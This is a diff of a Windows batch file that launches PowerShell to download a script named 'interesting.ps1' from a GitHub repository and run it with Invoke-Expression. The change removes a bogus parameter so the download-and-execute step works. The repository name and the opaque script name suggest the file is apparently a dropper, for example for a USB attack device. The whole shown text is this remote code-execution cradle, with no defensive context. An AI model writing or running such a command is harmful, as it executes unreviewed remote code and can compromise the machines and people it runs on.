@@ -5,7 +5,7 @@ REM Execute PowerShell to download and run the PowerShell script that will downl
 powershell -NoProfile -Command ^
     "try {" ^
     "    $scriptUrl = 'https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1';" ^
-    "    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicPipelining | Select-Object -ExpandProperty Content;" ^
+    "    $scriptContent = Invoke-WebRequest -Uri $scriptUrl | Select-Object -ExpandProperty Content;" ^
     "    Invoke-Expression $scriptContent;" ^
     "    Write-Host 'PowerShell script executed.'" ^
     "} catch {" ^
